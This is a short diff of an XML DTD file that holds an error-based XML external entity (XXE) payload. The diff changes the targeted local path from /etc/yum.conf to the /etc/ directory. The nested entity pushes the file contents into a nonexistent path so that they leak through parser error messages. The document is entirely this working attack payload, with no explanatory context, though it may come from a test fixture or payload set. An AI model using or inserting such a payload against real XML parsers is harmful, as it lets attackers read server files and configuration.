@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/yum.conf">
+<!ENTITY % file SYSTEM "file:///etc/">
 <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '/thisisnotafile/%file;'>">
 %eval;
 %exfiltrate;
